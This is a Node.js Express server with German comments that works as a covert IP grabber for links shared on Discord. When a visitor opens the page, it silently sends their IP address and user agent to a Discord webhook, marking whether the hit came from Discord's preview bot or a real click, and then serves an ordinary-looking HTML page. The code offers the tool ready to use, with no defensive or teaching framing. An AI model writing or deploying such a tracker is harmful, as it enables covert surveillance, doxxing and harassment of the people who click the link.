const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// DEIN DISCORD WEBHOOK HIER EINTRAGEN
const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN';

// Wichtig für Cloud-Hosting (um die echte User-IP zu bekommen)
app.set('trust proxy', true);

app.get('/', async (req, res) => {
    // IP Adresse abgreifen
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.get('User-Agent');

    // Filtern: Wir wollen wissen, ob es der Discord-Bot (Vorschau) oder ein echter Klick ist
    const isBot = userAgent.includes('Discordbot') ? "🤖 Discord Vorschau-Bot" : "👤 Echter Besucher";

    // Nachricht an deinen Discord Webhook senden
    try {
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: "Neuer Zugriff erfasst",
                color: userAgent.includes('Discordbot') ? 16776960 : 3066993, // Gelb für Bot, Grün für User
                fields: [
                    { name: "Typ", value: isBot, inline: true },
                    { name: "IP-Adresse", value: `\`${ip}\``, inline: true },
                    { name: "Browser / Gerät", value: userAgent }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        console.error("Fehler beim Senden an Webhook:", err.message);
    }

    // Dem Besucher die HTML-Datei schicken
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server läuft auf Port ${PORT}`);
});
